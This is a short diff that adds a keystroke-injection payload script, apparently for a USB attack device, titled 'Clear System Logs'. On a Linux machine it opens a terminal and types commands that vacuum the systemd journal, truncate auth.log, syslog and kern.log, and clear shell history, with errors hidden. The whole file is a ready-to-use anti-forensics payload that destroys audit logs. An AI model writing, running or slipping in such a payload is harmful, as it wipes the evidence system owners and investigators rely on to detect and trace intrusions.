@@ -1,0 +1,12 @@
+META linux util
+REM Title: Clear System Logs
+REM Description: Clears system logs - requires sudo
+
+DEFAULTDELAY 500
+CTRL ALT t
+DELAY 800
+STRING sudo journalctl --rotate 2>/dev/null; sudo journalctl --vacuum-time=1s 2>/dev/null; sudo truncate -s 0 /var/log/auth.log /var/log/syslog /var/log/kern.log 2>/dev/null; history -c
+ENTER
+DELAY 2000
+STRING exit
+ENTER
